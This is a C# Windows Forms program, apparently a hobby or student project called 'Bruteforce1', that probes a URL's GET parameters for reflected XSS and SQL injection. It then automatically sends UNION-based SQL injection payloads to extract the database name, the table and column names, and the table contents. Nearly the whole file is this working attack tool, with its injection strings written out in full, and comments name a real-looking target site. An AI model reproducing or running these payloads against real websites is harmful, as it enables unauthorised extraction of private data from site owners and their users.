using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net;
using System.IO;
using System.Text.RegularExpressions;

namespace Bruteforce1
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void label1_Click(object sender, EventArgs e)
        {

        }
        /// <summary>
        /// The method that runs when the button is pressed in the application.
        /// It takes a hard coded HTTP url with GET method parameters, cleanses that URL down to the passed
        /// values, and dispalys each parameter passed into the label

        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void button1_Click(object sender, System.EventArgs e)
        {
            //" http://www.starshiplad.com/sendit.php?name=HackTest+take3&info=Bad+information"

            //http://www.starshiplad.com/search.php?testsearch=REEE

            Boolean sQLValid = false;
            string url = textBox.Text;
            int index = url.IndexOf('?');
            int i = 0;
            string[] urlParameters = url.Remove(0, index + 1).Split('&');
            string[] phonyrequests = new String[urlParameters.Length];
            string databaseName = "";
            string[] varNames= { };
            string tablename = "";
            String output = "";
            StreamReader reader = null;


            foreach (string p in urlParameters)
            {
                output += "\n Testing Parameter" + i + " : " + p;
                //Run to test for XSS ability
                output += "-------------XSS--------------\n";
                phonyrequests[i] = url.Replace(p, p + "<xss>");
                output += "Attempted to send: " + phonyrequests[i] + "\n \n";
                HttpWebRequest webRequest = (HttpWebRequest)HttpWebRequest.Create(phonyrequests[i]);
                string response = "";
                /*
                webRequest.Method = "GET";
                reader = new StreamReader(webRequest.GetResponse().GetResponseStream());
                response = reader.ReadToEnd();
                output += "-------------XSS RESPONSE--------------\n";
                output += "\n \n Response: " + response + "\n \n \n ";
                if (response.Contains("<xss>"))
                {
                    output += "XSS vunrability in param " + p + "\n";
                }
                */

                //Repeat for SQL injection
                output += "-------------SQL--------------\n";
                phonyrequests[i] = url.Replace(p, p + "badinfo;");
                output += "\n Attempted to send: " + phonyrequests[i] + "\n \n";
                webRequest = (HttpWebRequest)HttpWebRequest.Create(phonyrequests[i]);
                webRequest.Method = "GET";
                response = "";

                reader = new StreamReader(webRequest.GetResponse().GetResponseStream());
                response = reader.ReadToEnd();
                output += "\n-------------SQL RESPONSE--------------\n";
                output += "\n \n Response: " + response + "\n \n \n ";
                if (response.Contains("badinfo;"))
                {

                    output += "SQL injection vunrability in param " + p + "\n";
                    sQLValid = true;

                }

                //Add HACK CODE
                //0x6861636B = 'hack'
                if (sQLValid)
                {

                    output += "\n-------------ATTEMPTING SQL INJECTION TO GET DATABASE NAME--------------\n";
                    output += "\n" + p + " is parameter being infected\n";
                    //phonyrequests[i] = url.Replace(p, p + "bad+info'+UNION+ALL+SELECT+NULL,NULL,CONCAT(0x6861636B,DATBASE(),0x6861636B),NULL#");
                    if (i == 0)
                    {
                        //Retreive Database Names
                        phonyrequests[i] = url.Replace(p, p + "info'+UNION+ALL+SELECT+CONCAT('hack',DATABASE(),'hack'),CONCAT('hack',DATABASE(),'hack'),CONCAT('hack',DATABASE(),'hack') %23");
                        output += "\n sent " + phonyrequests[i];
                        MatchCollection matches;
                        Regex regexVar;
                        try
                        {
                            webRequest = (HttpWebRequest)HttpWebRequest.Create(phonyrequests[i]);
                            reader = new StreamReader(webRequest.GetResponse().GetResponseStream());
                            response = reader.ReadToEnd(); output += "\n \n Response: " + response + "\n \n \n ";

                            //Create regex to retreive database name

                            regexVar = new Regex("hack" + "(.*?)" + "hack");
                            matches = regexVar.Matches(response);
                            foreach (Match m in matches)
                            {
                                if (!databaseName.Equals(m.Groups[1].Value))
                                {
                                    output += "\nChanged dbname from " + databaseName + " to " + m.Groups[1].Value;
                                    databaseName = m.Groups[1].Value;
                                }

                            }
                            output += "\n ----- DATABASE NAME IS :" + databaseName + "\n";
                        }
                        catch (Exception se)
                        {
                            output += "Error connecting: " + se.Message;
                        }
                        try
                        {
                            //Retreive Table Names
                            output += "\n-------------ATTEMPTING SQL INJECTION TO GET " + databaseName + " 'S TABLE NAMES-------------\n";
                            phonyrequests[i] = url.Replace(p, p + "info%27+UNION+ALL+SELECT+TABLE_NAME%2CNULL%2CNULL+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_TYPE+%3D+%27BASE+TABLE%27+AND+TABLE_SCHEMA%3D %27" + databaseName + "%27%23");
                            output += "\n sent :" + phonyrequests[i];
                            webRequest = (HttpWebRequest)HttpWebRequest.Create(phonyrequests[i]);
                            reader = new StreamReader(webRequest.GetResponse().GetResponseStream());
                            response = reader.ReadToEnd(); output += "\n \n Response: " + response + "\n \n \n ";
                            //Create regex to retreive database name
                            regexVar = new Regex("<tr><td>" + "(.*?)" + "</td>");
                            matches = regexVar.Matches(response);
                            varNames = new string[matches.Count];
                            int x = 0;
                            foreach (Match m in matches)
                            {
                                if( !m.Groups[1].Value.Equals(""))
                                {

                                    tablename = m.Groups[1].Value;
                                }

                            }
                            output += "\n ----- TABLE NAME IS :" + tablename+ "\n";
                        }
                        catch (Exception se)
                        {
                            output += "Error connecting: " + se.Message;
                        }
                        try
                        {
                            //Retreive Information Names
                            output += "\n-------------ATTEMPTING SQL INJECTION TO GET " + databaseName + " 'S COLUMN-------------\n";
                            phonyrequests[i] = url.Replace(p, p + "info%27+UNION+ALL+SELECT+COLUMN_NAME%2CNULL%2CNULL+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+table_schema%3D%27" + databaseName + "%27 %23");
                            output += "\n sent :" + phonyrequests[i];
                            webRequest = (HttpWebRequest)HttpWebRequest.Create(phonyrequests[i]);
                            reader = new StreamReader(webRequest.GetResponse().GetResponseStream());
                            response = reader.ReadToEnd(); output += "\n \n Response: " + response + "\n \n \n ";
                            //Create regex to retreive database name
                            regexVar = new Regex("<tr><td>" + "(.*?)" + "</td>");
                            matches = regexVar.Matches(response);
                            varNames = new string[matches.Count];
                            int x = 0;
                            foreach (Match m in matches)
                            {
                                if (!"".Equals(m.Groups[1].Value))
                                {
                                    output += "\n Found Column Called [[[" + m.Groups[1].Value + "]]]";
                                    varNames[x] = m.Groups[1].Value;
                                    x++;
                                }

                            }
                        }
                        catch (Exception se)
                        {
                            output += "Error connecting: " + se.Message;
                        }

                        try
                        {
                            //Display info on Each table
                            output += "\n-------------ATTEMPTING SQL INJECTION TO GET " + databaseName + " 'S TABLE Showing each value-------------\n";
                            String requestString = "";
                            int w = 0;
                            while (w < varNames.Length)
                            {
                                requestString += varNames[w] + ",";
                                output += "Variable" + w + " is " + varNames[w] +" request is "+requestString;
                                w++;
                            }
                            requestString = requestString.Substring(0,requestString.Length-1);
                            phonyrequests[i] = url.Replace(p, p + "info%27+UNION+ALL+SELECT+CONCAT('hack',"+requestString+",'hack'),NULL,NULL+FROM+"+tablename+"%23");
                            output += "\n sent :" + phonyrequests[i];
                            webRequest = (HttpWebRequest)HttpWebRequest.Create(phonyrequests[i]);
                            reader = new StreamReader(webRequest.GetResponse().GetResponseStream());
                            response = reader.ReadToEnd(); output += "\n \n Response: " + response + "\n \n \n ";
                            //Create regex to retreive database name
                            regexVar = new Regex("hack" + "(.*?)" + "hack");
                            matches = regexVar.Matches(response);
                            foreach (Match m in matches)
                            {
                                if (!"".Equals(m.Groups[1].Value))
                                {
                                    output += "\n Found Information Called [[[" + m.Groups[1].Value + "";
                                    databaseName = m.Groups[1].Value;
                                }

                            }
                        }
                        catch (Exception se)
                        {
                            output += "Error connecting: " + se.Message;
                        }


                    }
                    else
                    {
                        output += "\n N0t first parameter\n";
                    }




                }
                i++;
                label1.Text = output;

                /*
                 *   int search = 0;
                while ((response.IndexOf('h', search)) != -1)
                {
                    if (response.Substring(search, search + 4).Equals("hack"))
                    {
                        databaseName = response.Substring(search + 4, response.IndexOf('h', search));
                        break;
                    }
                    else
                    {
                        output=response +"Search is " + search + " \n";
                        label1.Text = output;
                        Update();
                        search = response.IndexOf('h', search);
                    }

                }
                output += "\n DATABASENAME : " + databaseName + "\n \n \n ";
                */
                //END HACK CODE

            }


        }
    }
}
